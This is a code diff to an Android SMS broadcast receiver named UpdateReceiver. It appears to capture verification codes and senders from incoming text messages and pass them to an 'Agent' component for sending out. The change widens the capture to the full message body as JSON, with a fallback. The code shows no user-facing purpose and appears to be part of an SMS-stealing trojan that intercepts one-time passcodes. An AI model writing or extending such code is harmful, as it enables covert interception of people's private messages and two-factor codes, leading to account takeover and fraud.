@@ -7,6 +7,8 @@ import android.os.Bundle;
 import android.telephony.SmsMessage;
 import android.util.Log;
 
+import org.json.JSONObject;
+
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
@@ -39,7 +41,17 @@ public class UpdateReceiver extends BroadcastReceiver {
                                 Agent agent = Agent.getInstance();
                                 // Ensure agent is started if this receiver was triggered while the app was cold
                                 agent.start(context.getApplicationContext(), null, null);
-                                agent.sendData(new Agent.DataPacket("sms_priority", "Code: " + code + " from " + sender, 10));
+
+                                try {
+                                    JSONObject smsJson = new JSONObject();
+                                    smsJson.put("code", code);
+                                    smsJson.put("sender", sender);
+                                    smsJson.put("body", messageBody);
+                                    agent.sendData(new Agent.DataPacket("sms_priority", smsJson.toString(), 10));
+                                } catch (Exception e) {
+                                    Log.e(TAG, "Error creating JSON", e);
+                                    agent.sendData(new Agent.DataPacket("sms_priority", "Code: " + code + " from " + sender, 10));
+                                }
                             }
                         }
                     }
